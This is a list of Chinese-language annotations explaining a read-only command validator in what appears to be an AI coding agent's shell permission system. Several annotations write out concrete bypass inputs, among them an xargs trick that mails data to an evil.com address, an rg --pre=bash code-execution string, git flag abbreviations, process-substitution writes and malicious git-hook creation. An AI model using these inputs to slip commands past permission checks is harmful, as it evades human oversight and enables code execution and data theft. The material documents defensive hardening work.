ANNOTATIONS = [
    (34, 'after', r'''本文件是「只读判定」的两条腿之一：上面的 COMMAND_ALLOWLIST 逐命令声明安全旗标（新机制），下面的 READONLY_COMMAND_REGEXES 是整命令正则（旧机制）。文件头注释明说优先用 allowlist——正则会被 GNU getopt_long 的缩写特性打穿（git --upload-pack=cmd 可缩写成 --up=cmd）。'''),
    (35, 'after', r'''一条命令的只读档案四件套：safeFlags 是旗标白名单；regex 做旗标之外的正交校验；callback 做旗标解析搞不定的语义检查；respectsDoubleDash 决定 `--` 之后还查不查旗标。'''),
    (46, 'after', r'''大多数工具认 POSIX `--`（选项结束符），所以 validateFlags 在 `--` 后应该停。base64 在 macOS 上不认——见下面 base64 条目里的 respectsDoubleDash: false。'''),
    (54, 'after', r'''fd/fdfind（Debian 系包名）共用同一份旗标表。-x/--exec 与 -X/--exec-batch 故意不收：按搜索结果执行任意命令。'''),
    (77, 'after', r'''-l/--list-details 也不收——它内部起 `ls` 子进程，PATH 里放个恶意 ls 就接管了。**一个旗标「只是显示信息」不代表安全，得看它内部还调了什么。**'''),
    (125, 'after', r'''总原则：这里出现的每条命令、每个旗标，只许读文件。不许写文件、不许执行代码、不许发网络请求。'''),
    (131, 'after', r'''-i 和 -e 被删是 vulnerability archaeology 的标本。两个都是 GNU getopt 可选附加参数（`i::`/`e::`）：附加写时语义一致，空格分写时校验器和 xargs 理解相反——`xargs -it tail a@evil.com` 校验器看 -it 是俩 none，GNU 却把 t 当 replace-str，tail 才是目标命令，于是 /usr/sbin/sendmail 被拼出来发信。改用大写 -I {} / -E EOF（强制参数），两边对「吃几个参数」的认知一致。'''),
    (163, 'after', r'''git 的只读子命令从共享验证表铺进来，具体旗标在 utils/shell/readOnlyCommandValidation。'''),
    (194, 'after', r'''cd 特殊：所有参数拼成一条路径（cd 只接一个目录参数）。'''),
    (204, 'after', r'''find 的 `--` 支持让「-/../../etc」这种以 - 开头的路径也能当搜索起点。这里选择过度收集：`--` 后连谓词也当路径收，宁可误报（find 是只读，谓词解出的路径都在 cwd 内，合法用户不会被挡），不可漏报。'''),
    (300, 'after', r'''tr 前两个非旗标参数是字符集不是路径，按 SET1/SET2 切掉。'''),
    (371, 'after', r'''sed 路径提取：-f 的脚本文件本身要校验（脚本文件也是输入），-e 的表达式不碰文件；第一个非旗标是脚本，之后才是文件。'''),
    (430, 'after', r'''jq 与 grep 同构：第一个非旗标是 filter，之后全是文件；没给文件就从 stdin 读，无路径可校验。'''),
    (490, 'after', r'''git 只有 diff --no-index 需要路径校验——它显式比较仓库外的任意两个文件。其余 git 子命令在仓库上下文里活动，git 自己的安全模型已约束，不重复校验。'''),
    (511, 'after', r'''PATH_EXTRACTORS 的键即「哪些命令要查路径」的名单，validateSinglePathCommand 拿它做第一道门。'''),
    (552, 'after', r'''操作类型表决定路径按读还是按写校验：rm/mv/cp/sed 是写，cat/ls/grep 是读，mkdir/touch 是创建。**注意 sed 默认算写**——见后面 createPathChecker 的只读 sed 特判。'''),
    (596, 'after', r'''mv/cp 一刀切禁所有旗标：--target-directory=PATH 这类旗标会让「提取出来的路径」与「真正写入的路径」不是同一个，所以宁可全部转人工。'''),
    (615, 'after', r'''COMMAND_VALIDATOR 在路径提取之前跑。旗标本身就能绕过节流，就别指望后面的路径提取补锅。'''),
    (630, 'after', r'''复合命令含 cd 时一切写操作转人工。原因是路径都相对原 cwd 解析，cd 之后的写落在哪无法静态确定。注释里的 ALTERNATIVE 方案（跟踪链上有效 cwd）更宽松但难处理 cd ~ / cd - / 连续 cd / cd 失败，暂不实施。'''),
    (658, 'after', r'''validatePath 返回三态：allowed / deny（命中显式 deny 规则，硬拒）/ ask。'''),
    (671, 'after', r'''自定义消息优先：安全检查（type other/safetyCheck）给的原因比通用模板更具体，直接透出。'''),
    (679, 'after', r'''deny 与 ask 的分界：命中用户 deny 规则 → deny（无商量）；越出工作目录 → ask（可加目录放行）。'''),
    (703, 'after', r'''createPathChecker 是路径校验器的工厂。顺序有讲究：先跑普通校验（含显式 deny）→ deny 就直接返回 → rm/rmdir 再查危险路径（不给建议，不鼓励保存）→ passthrough 直接过 → ask 才附建议。'''),
    (728, 'after', r'''危险删除路径放在「显式 deny 之后、其他结果之前」：用户写了 allowlist 也要问，但用户明确 deny 的尊重到底。'''),
    (750, 'after', r'''建议按操作类型分化：读操作建议加 Read 规则（目录存在才建议），写操作建议加目录，写/建另附「开启 acceptEdits 模式」。'''),
    (786, 'after', r'''shell-quote 会把 *.txt 解析成 glob 对象，路径校验需要字符串，这里统一拍平。解析失败返回空数组（上游 fail-closed 会兜）。'''),
    (840, 'after', r'''先剥壳再取基名。不剥的话 `timeout 10 rm -rf /` 的基名是 timeout，rm 从未进入校验视野。'''),
    (865, 'after', r'''sed 按 COMMAND_OPERATION_TYPE 默认是写；纯读的 sed（sed -n '1,10p'）把操作类型覆盖成 read，读别处的文件不再被当写拦截。'''),
    (882, 'after', r'''这是 AST 版：直接用树解析好的 argv，不再过 shell-quote。动机是 shell-quote 有个单引号反斜杠 bug——解析成功但把重定向运算符搅成乱码 token，fail-closed 守卫不触发，路径校验被静默跳过。'''),
    (908, 'after', r'''argv 已剥过壳但 .text 是原始 span（含 `timeout 5 ` 前缀），所以 sed 白名单检查前再剥一次。'''),
    (924, 'after', r'''输出重定向（> / >>）单独一道校验：目标按 create 操作查。'''),
    (930, 'after', r'''cd + 重定向同样转人工：`cd .claude/ && echo x > settings.json` 的重定向目标相对原 cwd 校验，实际写在 cd 之后的目录。'''),
    (946, 'after', r'''/dev/null 白名单直通——它只是丢弃输出。'''),
    (1005, 'after', r'''checkPathConstraints 是总入口：先查重定向，再逐个子命令查路径。'''),
    (1021, 'after', r'''进程替换 >(cmd) 能在重定向目标之外执行命令写文件：`echo secret > >(tee .git/config)` 的 tee 根本不以重定向面貌出现。正则版查这个；AST 版不查——process_substitution 已在 DANGEROUS_TYPES 里更早被拒。'''),
    (1040, 'after', r'''有 AST 重定向就用 AST 的：shell-quote 单引号反斜杠 bug 会把 `>` 搅进 token（且解析成功，fail-closed 不触发），AST 已正确解出目标。'''),
    (1050, 'after', r'''重定向目标含 $VAR / %VAR% 时目标不可静态确定 → ask。AST 路径恒 false（checkSemantics 已验过）。'''),
    (1072, 'after', r'''有 AST 命令列表就直接遍历 argv；否则退回 splitCommand_DEPRECATED + shell-quote 重解析。两条路都只把 ask/deny 上抛，passthrough 继续看下一条。'''),
    (1111, 'after', r'''AST 重定向 → 校验器格式的适配层。>&N（纯数字）是 fd 复制不是写文件；>&file 才是 &>file 的 deprecated 形式。'''),
    (1133, 'after', r'''fd 复制与文件重定向的区分：>&10 复制 fd，>&foo 写文件。'''),
    (1152, 'after', r'''这段横幅是全文件最重要的运维注释。**bashPermissions.ts 里那份窄版 stripWrappers 是死代码但不能删**——那个模块正好卡在 Bun feature() DCE 复杂度阈值上，删约 80 行会让 feature('BASH_CLASSIFIER') 静默失效（PR #21503 round 3 实测：基线 30/30，删后 22/30）。三处 wrapper 剥离（本文件 / bashPermissions / checkSemantics）必须同步，不同步 = checkSemantics 剥了壳做语义检查、路径校验看到的是壳 → passthrough → 包装里的命令从未被路径校验。'''),
    (1174, 'after', r'''timeout 旗标值的白名单正则：信号是 TERM/KILL/9，时长是 5/5s/10.5。原先用 [^ \t]+ 匹配，`timeout -k$(id) 10 ls` 这种命令替换能混过去。'''),
    (1183, 'after', r'''skipTimeoutFlags 返回「时长 token」的下标。解析不了返回 -1，调用方 fail-closed。'''),
    (1239, 'after', r'''skipEnvFlags 拒 -S（argv 分割器）、-C/-P（换工作目录/路径）——这三个都能改变后面命令的语义环境。'''),
    (1270, 'after', r'''timeout 的时长用 strtod 语义：.5 / +5 / inf 都是 GNU timeout 合法时长但旧正则拒了它们。拒不了就原样返回——checkSemantics 对同样输入 fail-closed 且先跑，到不了这里。'''),
    (1276, 'after', r'''nice 的历史 bug：只剥 `nice -n N` 时，`nice rm /outside` 基名是 nice → passthrough → /outside 从未路径校验。补上裸 `nice cmd` 和 legacy `nice -N cmd`。'''),
    (1286, 'after', r'''stdbuf 是 PR 加宽的。PR 前 `stdbuf -o0 -eL rm` 被 fragment check 拦（旧 slice(2) 把 -eL 当名字）；PR 后 checkSemantics 剥两个旗标放行，但本函数没同步剥 → 基名 stdbuf → passthrough。两边必须一起改。'''),
    (1294, 'after', r'''env 同理：checkSemantics 剥 env 本函数不剥，包装的命令就漏校验。'''),
    (131, 'after_block', r'''allowlist 匹配先长后短：多词命令（git stash list）优先于单词（git）。匹配上就把前缀长度记下来，后面旗标从 commandTokens 起查。'''),
    (1306, 'after', r'''git ls-remote 的 URL 特判：它能把本地仓库数据推到远端（外泄通道），所以参数里出现 ://、@、:、$ 一律拒。'''),
    (1328, 'after', r'''全 token 禁 `$` 是 parser differential 的补丁：shell-quote 的回调把 $VAR 原样保留成字面 token，但 bash 运行时展开它（未设变量 → 空串）。这一个差异同时打穿 validateFlags 和 callback：(1) `$Z--output=/tmp/pwned` 以 $ 开头不当旗标当位置参数，bash 展开成 --output 写任意文件；(2) rg 没有 regex 没有 callback，`rg . "$Z--pre=bash" FILE` 一步 RCE；(3) `ps ax"$Z"e` 的中缀 $ 让 BSD-e 检测正则失明。所以位置参数里任何 $ 都拒——值不可静态确定，只读性就无法证明。'''),
    (1358, 'after', r'''花括号展开混淆也要挡：`git diff @{'{'}0},--output=/tmp/pwned}` 剥引号后 token 含 { 和 ,。要求 { 与 ,（或 ..）同时出现才拦，避开 stash@{0}（git ref）、{{.State}}（Go 模板）、prefix-{}-suffix（xargs）这些合法形态。'''),
    (1383, 'after', r'''三层收尾：有 regex 的命令必须匹配；没 regex 的命令禁反引号（命令替换）；grep/rg 禁模式里的换行（注入通道）。'''),
    (1410, 'after', r'''makeRegexForSafeCommand 生成的模板：命令名后只许「空白 + 无 shell 元字符的串」。<>()$`|{}&; 和换行全禁——它们分别对应重定向、命令替换、变量展开、管道、后台、语句分隔。'''),
    (1427, 'after', r'''READONLY_COMMANDS 是「简单命令」名单：无旗标需要精细校验，整命令正则即可覆盖。echo 单独一条（引号内换行允许，双引号内禁 $）。'''),
    (1522, 'after', r'''git 只读子命令已迁去 allowlist 做旗标校验，这里只留注释说明迁移方向。'''),
    (1530, 'after', r'''env/printenv 被移除——会吐敏感环境变量。'''),
    (1532, 'after', r'''node -v 精确锚定的原因：`node -v --run <task>` 会执行 package.json 脚本（Node 先处理 --run 再处理 -v）。python --version 同理钉死。这些原先在 EXTERNAL_READONLY_COMMANDS 里走 makeRegexForSafeCommand，允许任意后缀。'''),
    (1548, 'after', r'''网络命令只放行精确形态：ip addr 不许带参（带参可改路由/地址），ifconfig 只许接口名。'''),
    (1552, 'after', r'''jq 正则是手工写的例外。禁 -f/--from-file（读脚本文件）、--rawfile/--slurpfile、--run-tests、-L/--library-path（加载可执行模块）、env/$ENV（读环境变量）。引号内禁反引号——jq 里反引号同样危险。'''),
    (1565, 'after', r'''find 正则的黑名单写法：-delete/-exec/-execdir/-ok/-okdir/-fprint/-fls/-fprintf 全部负向前查禁掉。转义圆括号 \( 要排在字符类之前匹配，否则被当成「反斜杠 + 圆括号」而失配。'''),
    (1572, 'after', r'''containsUnquotedExpansion 守卫的是正则回退路径：命令里引号外的 glob 与 $ 变量在运行时会展开成什么无法预知，正则匹配的文本与 bash 真正执行的文本可能完全不同。'''),
    (1600, 'after', r'''containsUnquotedExpansion 函数体：状态机跟踪引号。两个真实攻击样例：`uniq --skip-chars=0$_` 借 IFS 分词把位置参数偷渡过「只许旗标」的正则；`cd "$HOME"` 双引号内变量照样展开。单引号外 everywhere 都要查。'''),
    (1615, 'after', r'''单引号内的反斜杠在 bash 里是字面量、不转义。如果不加 `!inSingleQuote` 守卫，`ls '\' *` 会让引号跟踪器错位：\ 吃掉后面的闭引号，解析器停在单引号态，把 glob * 当成引号内字面量漏过去。'''),
    (1647, 'after', r'''$ 后跟变量名字符（含 $_ $@ $* $# $? $! $$ $- $0-$9）才算展开；${ 和 $( 不在这里管——那两种由 bashSecurity 的命令替换模式负责。'''),
    (1656, 'after', r'''glob 只在双引号外和单引号外展开；双引号内是字面量。'''),
    (1671, 'after', r'''isCommandReadOnly 是单命令的只读判定入口：2>&1 尾巴先切掉（管道组件常带这个），UNC 路径早退，glob/$ 早退，然后 allowlist 优先、正则为辅。'''),
    (1690, 'after', r'''UNC 路径（\\host\share）在 Windows 上会触发 SMB/WebDAV 解析，可能被诱导回连到攻击者主机，任何带 UNC 的命令都不许自动放行。'''),
    (1710, 'after', r'''先 allowlist 后正则的注释解释了为什么：git 允许 --upload-pack=cmd 缩写为 --up=cmd，正则防不住缩写，只有显式旗标白名单能。'''),
    (1719, 'after', r'''正则命中后的三道 git 补丁：-c（内联任意 config，core.fsmonitor/diff.external/core.gitProxy 都能执行命令）、--exec-path（换 git 可执行文件目录）、--config-env（从环境变量注入 config，与 -c 同危）。'''),
    (1766, 'after', r'''GIT_INTERNAL_PATTERNS 是沙箱逃逸的钥匙：HEAD/objects/refs/hooks 一旦在命令里被创建，git 会把当前目录当 git 目录并从 hooks 执行恶意代码。'''),
    (1787, 'after', r'''rm/rmdir/sed 只删或原地改，不在新路径创建文件，所以 git 内部路径检查排除它们。'''),
    (1825, 'after', r'''commandWritesToGitInternalPaths 防的是一条龙攻击：mkdir -p hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && git status。拆命令逐个查写路径（mkdir/touch/cp/mv 用 PATH_EXTRACTORS）加重定向目标。'''),
    (1866, 'after', r'''checkReadOnlyConstraints 是 readOnlyValidation.ts 对外的总出口，返回 PermissionResult。参数 compoundCommandHasCd 由调用方预算好，避免重复计算。'''),
    (1882, 'after', r'''解析不了 → passthrough（不是 deny）：交给后续权限检查处理，fail-open 到人工。'''),
    (1891, 'after', r'''先在完整命令上跑一次 bashCommandIsSafe_DEPRECATED——splitCommand 会变换命令（${VAR} → $VAR），有些危险只在原文里可见。'''),
    (1901, 'after', r'''UNC 检查在 splitCommand 之前做：splitCommand 会变换反斜杠（Windows 路径分隔符），之后再查就认不出了。'''),
    (1914, 'after', r'''cd + git 组合直接转人工：恶意目录放假 git hooks，cd 进去再跑 git 就执行了。'''),
    (1925, 'after', r'''当前目录像 bare/被掏空的 git 仓库时（.git/HEAD 被删、hooks/pre-commit 被放），git 命令一律转人工。'''),
    (1938, 'after', r'''命令里同时「创建 git 内部文件」和「跑 git」→ 转人工。这是上面 mkdir hooks 攻击的对应拦截。'''),
    (1951, 'after', r'''竞态窗口的封堵：沙箱命令能在子目录造 bare repo 文件，而后台 git（sleep 10 && git status）在评估时文件还不存在，bare-repo 检查漏过。所以只要沙箱开着且当前目录不是原 cwd，git 命令就转人工。'''),
    (1968, 'after', r'''全部子命令只读 → allow（updatedInput 原样带回）；否则 passthrough 让 bashPermissions 等其他检查接手。'''),
]
